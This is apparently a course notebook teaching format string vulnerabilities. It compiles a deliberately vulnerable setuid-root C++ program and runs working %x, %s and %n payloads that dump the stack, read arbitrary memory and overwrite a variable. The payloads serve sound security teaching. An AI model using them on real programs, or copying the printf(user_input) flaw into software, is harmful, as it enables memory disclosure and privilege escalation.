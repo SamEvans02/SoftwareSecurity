{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Format Strings\n",
    "http://www.cplusplus.com/reference/cstdio/printf/?kw=printf\n",
    "\n",
    "- `printf()` in C/C++ can be used to print fixed strings, variables in many different formats\n",
    "- hello.cpp program uses `printf()` incorrectly!\n",
    "- \"Good Bye World!\\n\" string technically is the format string (devoid of special escape sequences called format parameters)\n",
    "- format parameters begins with a `%` sign; for each format parameter (%) function expects arguments\n",
    "- format specifier follows this prototype:\n",
    "`%[flags][width][.precision][length]specifier`\n",
    "\n",
    "- following parameter requires values/variables as arguments\n",
    "\n",
    "| Parameter | Output Type |\n",
    "| --- | --- |\n",
    "| %d | Decimal |\n",
    "| %u | Unsigned decimal |\n",
    "| %x | Hexadecimal |\n",
    "\n",
    "- the following parameters expect pointers/addresses as arguments\n",
    "\n",
    "| Parameter | Output Type |\n",
    "| --- | --- |\n",
    "| %s | String |\n",
    "| %n | Number of bytes written so far |\n",
    "| %p | Memory address |\n",
    "\n",
    "- `%s` - reads the data pointed to by the address/pointer provided as an argument\n",
    "- `%n` is intriguing parameter as it expectes integer address and writes number of bytes written so far to starndard output to that address!\n",
    "    - what could potentially go wrong here?!!...\n",
    "\n",
    "- `%s` and `%n` are the focus of the notebook"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <iostream>\r\n",
      "#include <cstdio>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "int main() {\r\n",
      "    cout << \"Hello World!\\n\";\r\n",
      "    printf(\"Good bye World!\\n\");\r\n",
      "    return 0;\r\n",
      "}"
     ]
    }
   ],
   "source": [
    "! cat demos/hello.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "# compile and run hello.cpp\n",
    "input=\"demos/hello.cpp\"\n",
    "output=\"hello.exe\"\n",
    "echo kali | sudo -S ./compile.sh $input $output"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hello World!\r\n",
      "Good bye World!\r\n"
     ]
    }
   ],
   "source": [
    "! ./hello.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Format Parameters Examples\n",
    "- let's look into fmt_strings.cpp program to see common usage of format strings and parameters"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstdio>\r\n",
      "#include <cstring>\r\n",
      "#include <string>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "\r\n",
      "int main(int argc, char * argv[]) {\r\n",
      "   char c_string[10] = \"sample\";\r\n",
      "   int A = -73;\r\n",
      "   unsigned int B = 31337;\r\n",
      "   string cpp_string = \"Hello from C++\";\r\n",
      "\r\n",
      "   // Example of printing with different format string\r\n",
      "   printf(\"[A] Dec: %d, Hex: %x, Unsigned: %u\\n\", A, A, A);\r\n",
      "   printf(\"[B] Dec: %d, Hex: %x, Unsigned: %u\\n\", B, B, B);\r\n",
      "   printf(\"[field width on B] 3: '%3u', 10: '%10u', 8: '%08u'\\n\", B, B, B);\r\n",
      "   printf(\"[c_string] %s is @ %p\\n\", c_string, c_string);\r\n",
      "   printf(\"[cpp_string] %s is @ 0x%08x\\n\", cpp_string.c_str(), &cpp_string);\r\n",
      "\r\n",
      "   // Example of unary address operator (dereferencing) and a %x format string\r\n",
      "   printf(\"variable A is at address: %p\\n\", &A);\r\n",
      "   return 0;\r\n",
      "}"
     ]
    }
   ],
   "source": [
    "! cat demos/fmt_strings/fmt_strings.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "input=\"demos/fmt_strings/fmt_strings.cpp\"\n",
    "output=fmt_strings.exe\n",
    "echo kali | sudo -S ./compile.sh $input $output"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[A] Dec: -73, Hex: ffffffb7, Unsigned: 4294967223\r\n",
      "[B] Dec: 31337, Hex: 7a69, Unsigned: 31337\r\n",
      "[field width on B] 3: '31337', 10: '     31337', 8: '00031337'\r\n",
      "[c_string] sample is @ 0xffffc351\r\n",
      "[cpp_string] Hello from C++ is @ 0xffffc334\r\n",
      "variable A is at address: 0xffffc34c\r\n"
     ]
    }
   ],
   "source": [
    "# note high value for A: -ve value is stored in two's complement\n",
    "! ./fmt_strings.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Format Parameter `%n`\n",
    "\n",
    "- `%n` - uncommon, but let's understand how it works\n",
    "- `%n` - writes the number of bytes written so far to the corresponding variable's address"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "#include <cstdio>\r\n",
      "#include <cstdlib>\r\n",
      "\r\n",
      "int main() {\r\n",
      "   int A = 5, B = 7, count_one, count_two;\r\n",
      "\r\n",
      "   // Example of a %n format string\r\n",
      "   printf(\"The number of bytes written up to this point X%n is being stored in count_one, and the number of bytes up to here X%n is being stored in count_two.\\n\", &count_one, &count_two);\r\n",
      "\r\n",
      "   printf(\"count_one: %d\\n\", count_one);\r\n",
      "   printf(\"count_two: %d\\n\", count_two);\r\n",
      "\r\n",
      "   // Stack Example\r\n",
      "   printf(\"A is %d and is at %08x.  B is %x.\\n\", A, &A, B);\r\n",
      "\r\n",
      "   return 0;\r\n",
      "}"
     ]
    }
   ],
   "source": [
    "cat demos/fmt_strings/fmt_uncommon.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "input=\"./demos/fmt_strings/fmt_uncommon.cpp\"\n",
    "output=fmt_uncommon.exe\n",
    "echo kali | sudo -S ./compile.sh $input $output"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The number of bytes written up to this point X is being stored in count_one, and the number of bytes up to here X is being stored in count_two.\r\n",
      "count_one: 46\r\n",
      "count_two: 113\r\n",
      "A is 5 and is at ffffc368.  B is 7.\r\n"
     ]
    }
   ],
   "source": [
    "! ./fmt_uncommon.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### structure of stack when printf( ) is called in fmt_uncommon.cpp\n",
    "- look at the last printf()\n",
    "\n",
    "#### printf(\"A is %d and is at %08x.  B is %x.\\n\", A, &A, B);\n",
    "\n",
    "- hint, arguments are pushed on reverse order (last argument first)\n",
    "\n",
    "\n",
    "|Top of the stack|\n",
    "| :----: |\n",
    "| Address of format string (first argument)|\n",
    "| Value of A|\n",
    "| Address of A|\n",
    "| Value of B|\n",
    "| ... |\n",
    "| Bottom of the Stack|"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### what if fewer arguments are passed to printf()?\n",
    "- `printf(\"A is %d and is at %08x. B is %x.\\n\", A, &A);`\n",
    "- what if no arguments are provided to parameters the printf() expects \n",
    "    - no argument is provided to %x parameter"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "15c15\r\n",
      "<    printf(\"A is %d and is at %08x.  B is %x.\\n\", A, &A, B);\r\n",
      "---\r\n",
      ">    printf(\"A is %d and is at %08x.  B is %x.\\n\", A, &A);\r\n"
     ]
    }
   ],
   "source": [
    "# see the difference between the original and the new file\n",
    "! diff demos/fmt_strings/fmt_uncommon.cpp demos/fmt_strings/fmt_uncommon2.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "# let's compile the fmt_uncommon2.cpp file\n",
    "input=demos/fmt_strings/fmt_uncommon2.cpp\n",
    "output=fmt_uncommon2.exe\n",
    "\n",
    "echo kali | sudo -S ./compile.sh $input $output"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The number of bytes written up to this point X is being stored in count_one, and the number of bytes up to here X is being stored in count_two.\r\n",
      "count_one: 46\r\n",
      "count_two: 113\r\n",
      "A is 5 and is at ffffc368.  B is 8049179.\r\n"
     ]
    }
   ],
   "source": [
    "# execute the program\n",
    "! ./fmt_uncommon2.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### what happened to the actual value of B?\n",
    "- since there's no corresponding argument for third `%x`, it pulled some value stored in the location where the third argument was supposted to be pushed on the stack\n",
    "- this is the value found found below the stack frame for the printf function\n",
    "- program read data from memory that it's not supposed to\n",
    "- violation of confidentialy and integrity of the data/program\n",
    "\n",
    "## The Format String Vulnerability\n",
    "- if string variable is printed directly `printf(string)` instead of `printf(\"%s\", string)`\n",
    "    - if the value of string variable is not trusted; user provided or received externally\n",
    "- let's demonstrate the format string vulnerability using fmt_vuln.cpp program\n",
    "\n",
    "- print four repeating bytes in reverse order (little-endian architecture)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstdio>\r\n",
      "#include <cstdlib>\r\n",
      "#include <cstring>\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "\r\n",
      "   static int test_val = -72;\r\n",
      "   char text[1024];\r\n",
      "   \r\n",
      "   if(argc < 2) {\r\n",
      "      printf(\"Usage: %s <text to print>\\n\", argv[0]);\r\n",
      "      exit(0);\r\n",
      "   }\r\n",
      "\r\n",
      "   strcpy(text, argv[1]);\r\n",
      "\r\n",
      "   printf(\"The right way to print user-controlled input:\\n\");\r\n",
      "   printf(\"%s\", text);\r\n",
      "\r\n",
      "   printf(\"\\n\\nThe wrong way to print user-controlled input:\\n\");\r\n",
      "   printf(text);\r\n",
      "   printf(\"\\n\\n\");\r\n",
      "\r\n",
      "   // Debug output\r\n",
      "   printf(\"[*] test_val @ 0x%08x = %d 0x%08x\\n\", &test_val, test_val, test_val);\r\n",
      "   printf(\"[*] text is @ %p\\n\", &text);\r\n",
      "   exit(0);\r\n",
      "}\r\n"
     ]
    }
   ],
   "source": [
    "! cat demos/fmt_strings/fmt_vuln.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "input=\"demos/fmt_strings/fmt_vuln.cpp\"\n",
    "output=\"fmt_vuln.exe\"\n",
    "echo kali | sudo -S ./compile.sh $input $output"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "# user is password for sudo user\n",
    "! echo kali | sudo -S chown root:root ./fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rwxr-xr-x 1 root root 21956 Dec 22 14:47 fmt_vuln.exe\r\n"
     ]
    }
   ],
   "source": [
    "# check ownership of the fmt_vuln.exe\n",
    "! ls -al fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S chmod u+s ./fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rwsr-xr-x 1 root root 21956 Dec 22 14:47 fmt_vuln.exe\r\n"
     ]
    }
   ],
   "source": [
    "! ls -al fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Usage: ./fmt_vuln.exe <text to print>\r\n"
     ]
    }
   ],
   "source": [
    "# run fmt_vuln.exe\n",
    "! ./fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "testing 124 abc #$\\556\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "testing 124 abc #$\\556\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = -72 0xffffffb8\r\n",
      "[*] text is @ 0xffffbf60\r\n"
     ]
    }
   ],
   "source": [
    "! ./fmt_vuln.exe \"testing 124 abc #\\$\\$556\"\n",
    "# Note $ has special meaning in printf() function; you'll see the usage below"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "testing5%s\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "testing5testing5%s\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = -72 0xffffffb8\r\n",
      "[*] text is @ 0xffffbf70\r\n"
     ]
    }
   ],
   "source": [
    "# what if you provide %s as value\n",
    "! ./fmt_vuln.exe \"testing5%s\"\n",
    "# notice testing repeats twice!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "testing%x\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "testingffffbf70\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = -72 0xffffffb8\r\n",
      "[*] text is @ 0xffffbf70\r\n"
     ]
    }
   ],
   "source": [
    "# what if you provide %x as part of value\n",
    "! ./fmt_vuln.exe testing%x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "data%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "dataffffbeb0.00000000.080491ac.61746164.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = -72 0xffffffb8\r\n",
      "[*] text is @ 0xffffbeb0\r\n"
     ]
    }
   ],
   "source": [
    "# process can be used repeatedly to examine stack memory\n",
    "# just provide a lot of format parameter as string and see what's on stack\n",
    "! ./fmt_vuln.exe $(python -c 'print(\"data\" + \"%08x.\"*40, end=\"\")')\n",
    "# Note: as more data is passed to the program, text address shifts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "%08x.\r\n"
     ]
    }
   ],
   "source": [
    "# bunch of 2e78383025 are repeated\n",
    "# each four bytes values are reversed due to little-endian architecture\n",
    "! python -c 'print(\"\\x25\\x30\\x38\\x78\\x2e\")'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# bunch of 2e78383025 are repeated, wonder what they are...\n",
    "# each four bytes values are reversed due to little-endian architecture\n",
    "! python -c 'print(\"\\x25\\x30\\x38\\x78\\x2e\", end=\"\")'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n"
     ]
    }
   ],
   "source": [
    "# try to print the same output in string\n",
    "! ./fmt_vuln.exe $(python -c 'print(\"%s.\"*40)')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Reading from Arbitrary Memory Addresses\n",
    "- `%s` format parameter can be used to read from arbitrary memory addresses\n",
    "- part of the original format string can be used to supply an address to the `%s` format parameter\n",
    "- if a valid memory address is used, this process could be used to read a string found at that memory address\n",
    "- we'll use demos/stack_overflow/getenvaddr.c to get some env variable address\n",
    "- use the path address to provide the value for %s\n",
    "\n",
    "```bash\n",
    "$ ./fmt_vuln.exe $(print \"\\x address in reverse bytes\")%08x-%08x-%08x-%s\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "AAAABBBB-%08x-%08x-%08x-%08x-%08x\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "AAAABBBB-ffffbf50-00000000-080491ac-41414141-42424242\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = -72 0xffffffb8\r\n",
      "[*] text is @ 0xffffbf50\r\n"
     ]
    }
   ],
   "source": [
    "# provide a bunch of %08x as a part of string to see where the first string repeats\n",
    "! ./fmt_vuln.exe AAAABBBB-%08x-%08x-%08x-%08x-%08x\n",
    "# notice that fourth parameter is repeating from begnning of the format string \n",
    "# AAAA to gets its data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "AAAA%08x-%08x-%08x-%s\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n"
     ]
    }
   ],
   "source": [
    "# try printing the AAAA as %s\n",
    "! ./fmt_vuln.exe AAAA%08x-%08x-%08x-%s\n",
    "# why do we get segfault?\n",
    "# it's attempting to print string at the address AAAA; recall %s needs address of c-string"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PATH=/home/kali/miniconda3/bin:/home/kali/miniconda3/condabin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games\r\n"
     ]
    }
   ],
   "source": [
    "# how about we provide some valid memory address instead of AAAA\n",
    "! env | grep $PATH"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "    char *ptr;\r\n",
      "\r\n",
      "    if(argc < 3) {\r\n",
      "        printf(\"Usage: %s <env variable name> <target program name>\\n\", argv[0]);\r\n",
      "    }\r\n",
      "    else {\r\n",
      "        ptr = getenv(argv[1]); /* get env var location */\r\n",
      "        int diff = (strlen(argv[0]) - strlen(argv[2]))*2;\r\n",
      "        ptr += diff; /* adjust for program name */\r\n",
      "        printf(\"%s will be at %p with reference to %s\\n\", argv[1], ptr, argv[2]);\r\n",
      "    }\r\n",
      "    return 0;\r\n",
      "}\r\n"
     ]
    }
   ],
   "source": [
    "# compile and run getevnaddr.c to find the memory address of env variables respective to programs\n",
    "! cat ./demos/stack_overflow/getenvaddr.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "input=\"./demos/stack_overflow/getenvaddr.cpp\"\n",
    "output=\"getenvaddr.exe\"\n",
    "echo kali | sudo -S ./compile.sh $input $output"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PATH will be at 0xffffc798 with reference to ./fmt_vuln.exe\r\n"
     ]
    }
   ],
   "source": [
    "! ./getenvaddr.exe PATH ./fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "����%08x-%08x-%08x-%s\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "����ffffbf60-00000000-080491ac-/home/kali/miniconda3/bin:/home/kali/miniconda3/condabin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = -72 0xffffffb8\r\n",
      "[*] text is @ 0xffffbf60\r\n"
     ]
    }
   ],
   "source": [
    "# lets try to read the value of PATH using fmt_vuln.exe\n",
    "! ./fmt_vuln.exe $(printf \"\\x98\\xc7\\xff\\xff\")%08x-%08x-%08x-%s"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Notice if part of variable name PATH= is missing from the value /home/user/...\n",
    "- we can stubtract (# of missing characters) from the least siginificant byte by reducing the PATH address by 5 bytes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "93"
     ]
    }
   ],
   "source": [
    "! printf \"%x\" $((0x98-5))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "����%08x-%08x-%08x-%s\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "����ffffbf60-00000000-080491ac-PATH=/home/kali/miniconda3/bin:/home/kali/miniconda3/condabin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = -72 0xffffffb8\r\n",
      "[*] text is @ 0xffffbf60\r\n"
     ]
    }
   ],
   "source": [
    "! ./fmt_vuln.exe $(printf \"\\x93\\xc7\\xff\\xff\")%08x-%08x-%08x-%s\n",
    "# now we see our complete path"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Writing to Arbitrary Memory Addresses\n",
    "- `%s` - can be used to read an arbitrary memory address\n",
    "- `%n` - can be can be used to write to arbitrary memory address\n",
    "- note that `test_val` variable has been printing its address and value in the debug statement\n",
    "\n",
    "```bash\n",
    "$ fmt_vuln.exe $(printf \"\\x reverse address of test_val\")-%08x-%08x-%08x-%n\n",
    "```\n",
    "\n",
    "- the resulting value in the test variable depends on the number of bytes written before the `%n`\n",
    "- this can be controlled to a a greater degree by manipulating the field width option\n",
    "\n",
    "```bash\n",
    "$ fmt_vuln.exe $(printf \"\\x reverse address of test_val\")-%x-%x-%x-%n\n",
    "$ fmt_vuln.exe $(printf \"\\x reverse address of test_val\")-%x-%x-%100x-%n\n",
    "$ fmt_vuln.exe $(printf \"\\x reverse address of test_val\")-%x-%x-%400x-%n\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "testing\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "testing\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = -72 0xffffffb8\r\n",
      "[*] text is @ 0xffffbf70\r\n"
     ]
    }
   ],
   "source": [
    "# let's note the address of testing\n",
    "! ./fmt_vuln.exe testing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "(�\u0004\b-%08x-%08x-%08x-%n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "(�\u0004\b-ffffbf60-00000000-080491ac-\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = 32 0x00000020\r\n",
      "[*] text is @ 0xffffbf60\r\n"
     ]
    }
   ],
   "source": [
    "# use the address of test_val to write to \n",
    "! ./fmt_vuln.exe $(printf \"\\x28\\xc0\\x04\\x08\")-%08x-%08x-%08x-%n\n",
    "# Notice the test_val which is the total bytes written thus far by printf()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "(�\u0004\b-%x-%x-%x-%n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "(�\u0004\b-ffffbf60-0-80491ac-\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = 24 0x00000018\r\n",
      "[*] text is @ 0xffffbf60\r\n"
     ]
    }
   ],
   "source": [
    "# value can be controlled by manipulating the field width of arguments before it\n",
    "! ./fmt_vuln.exe $(printf \"\\x28\\xc0\\x04\\x08\")-%x-%x-%x-%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "(�\u0004\b-%x-%x-%100x-%n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "(�\u0004\b-ffffbf60-0-                                                                                             80491ac-\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = 117 0x00000075\r\n",
      "[*] text is @ 0xffffbf60\r\n"
     ]
    }
   ],
   "source": [
    "# value can be controlled by manipulating the field width of arguments before it\n",
    "! ./fmt_vuln.exe $(printf \"\\x28\\xc0\\x04\\x08\")-%x-%x-%100x-%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "(�\u0004\b-%x-%284x-%200x-%n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "(�\u0004\b-ffffbf60-                                                                                                                                                                                                                                                                                           0-                                                                                                                                                                                                 80491ac-\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = 500 0x000001f4\r\n",
      "[*] text is @ 0xffffbf60\r\n"
     ]
    }
   ],
   "source": [
    "# value can be controlled by manipulating the field width of arguments before it\n",
    "! ./fmt_vuln.exe $(printf \"\\x28\\xc0\\x04\\x08\")-%x-%284x-%200x-%n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Writing User-Controlled Values (0xaddress)\n",
    "- the above trick (manipulating width) works for small numbers but won't work for large ones like memory addresses\n",
    "- let's write 0xDDCCBBAA to variable test_val\n",
    "- 0xAA goes to least significant byte, 0xBB to next byte and so on and 0xDD goes to the most significant byte\n",
    "- $ 0xAA -> 1^{st} byte$\n",
    "- $ 0xBB -> 2^{nd} byte$\n",
    "- $ 0xCC -> 3^{rd} byte$\n",
    "- $ 0xDD -> 4^{th} byte$\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "(�\u0004\b-%x-%x-%8x-%n\r\n",
      "\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "(�\u0004\b-ffffbf60-0- 80491ac-\r\n",
      "\r\n",
      "[*] test_val @ 0x0804c028 = 25 0x00000019\r\n",
      "[*] text is @ 0xffffbf60\r\n"
     ]
    }
   ],
   "source": [
    "# findout the width value to print 0xaa in the right location\n",
    "# 8 is used to standarize the output\n",
    "! ./fmt_vuln.exe $(printf \"\\x28\\xc0\\x04\\x08\")-%x-%x-%8x-%n"
   ]
  },
  {
